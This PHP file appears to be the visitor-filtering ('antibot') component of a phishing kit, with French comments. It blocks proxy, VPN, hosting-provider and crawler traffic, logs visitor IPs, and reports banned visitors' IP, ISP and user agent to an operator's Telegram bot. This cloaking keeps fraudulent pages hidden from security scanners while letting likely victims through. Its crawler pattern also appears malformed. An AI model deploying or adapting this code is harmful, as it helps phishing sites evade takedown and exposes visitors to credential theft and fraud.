<?php
include 'functions.php';

# ISPS Liste
$isps = @json_decode(@file_get_contents('../help/!#/isps.json'), true);
if (!$isps) {
    $isps = @json_decode(@file_get_contents('../../help/!#/isps.json'), true);
}

$_SESSION["lang"] = strtolower(substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2));

# Crawler Liste (Expression régulière avec délimiteurs corrigés)
$crawler = '/007ac9|/';

$ua = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];

# Fonction pour envoyer des notifications via Telegram
function sendWL($message, $chatid) {
    global $token;
  
    $query_params = array(
      'text' => $message,
      'chat_id' => $chatid
    );
  
    $reply_markup = array(
        'inline_keyboard' => array(
          array(
            array(
              'text' => '🫧 WhiteList ',
              'url' => "http://" . $_SERVER['SERVER_NAME'] . "/help/action/utils.php?wl=" . $_SERVER['REMOTE_ADDR']
            )
          ),
        )
      );
    $query_params['reply_markup'] = json_encode($reply_markup);

    if (function_exists('curl_version')) {
        $query_url = "https://api.telegram.org/bot$token/sendMessage";
        $curl = curl_init($query_url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($query_params));
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
        curl_exec($curl);
        curl_close($curl);
    } else {
        $query_url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query($query_params);
        file_get_contents($query_url);
    }
}

# Validation de la présence de bots ou utilisateurs indésirables
function validate() {
    global $movement_track, $chatidclick, $isp, $org;
    if ($movement_track == 1) {
        $message = "─────────── ⋆⋅ 🤖 ⋅⋆ ───────────
  
🤖 Le robot (".$_SERVER['REMOTE_ADDR'].") a été ban par les antibots
                           
─────────── ⋆⋅ 📶 ⋅⋆ ───────────
  
🤖 ISP / ORG    : ".$isp." / ".$org."
📍 Adresse IP   : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";
        sendWL($message, $chatidclick);
    }

    # Stoppe l'exécution du script sans afficher quoi que ce soit
    exit(); 
}

# Fonction pour vérifier les ISPS et ORG
function CheckIspOrg($org, $isp, $isps) {
    foreach ($isps as $country => $ispList) {
        foreach ($ispList as $ispItem) {
            if (stripos(strtolower($isp), strtolower($ispItem)) !== false) {
                return false;
            }
        }
        foreach ($ispList as $ispItem) {
            if (stripos(strtolower($org), strtolower($ispItem)) !== false) {
                return false;
            }
        }
    }
    return true;
}

# Fonction pour vérifier si l'IP est dans la liste noire
function checkIP() {
    global $banned;
    $banned_values = explode(',', $banned);
    if (in_array($_SERVER['REMOTE_ADDR'],$banned_values)) {
        return true;
    }
    return false;
}

# Liste des IPs autorisées
$whitelisted_values = explode(',', $whitelist);

if (!in_array($_SERVER['REMOTE_ADDR'],$whitelisted_values)) {
    
    # Assurez-vous que les variables sont définies avant de les utiliser
    $isp = isset($_SESSION['isp']) ? $_SESSION['isp'] : '';
    $org = isset($_SESSION['org']) ? $_SESSION['org'] : '';
    $proxy = isset($_SESSION['proxy']) ? $_SESSION['proxy'] : '';
    $hosting = isset($_SESSION['hosting']) ? $_SESSION['hosting'] : '';

    if ($proxy || $hosting) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "PROXY / VPN\n", FILE_APPEND);
        validate();  // Appelle la fonction de validation et arrête le script
    } elseif (CheckIspOrg($org, $isp, $isps)) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "ISPS / ORG\n", FILE_APPEND);
        validate();  // Appelle la fonction de validation et arrête le script
    } elseif (preg_match($crawler, $ua) || preg_match($crawler, $isp)) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "Crawler USER-AGENT\n", FILE_APPEND);
        validate();  // Appelle la fonction de validation et arrête le script
    } elseif (checkIP()) {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "BLACKLIST\n", FILE_APPEND);
        validate();  // Appelle la fonction de validation et arrête le script
    } else {
        file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/ip.txt', $ip . ' - ' . date('d/m/Y h:i:s') . "\n", FILE_APPEND);
    }
} else {
    file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/ip.txt', $ip . ' - ' . date('d/m/Y h:i:s') . "\n", FILE_APPEND);
}

# Vérification du captcha
if (!isset($_SESSION['captcha'], $_SESSION['captchaToken']) || $_SESSION['captcha'] != true) {
    header('Location: /');  // Redirige si le captcha échoue
    exit();  // Assure l'arrêt immédiat du script
}

?>
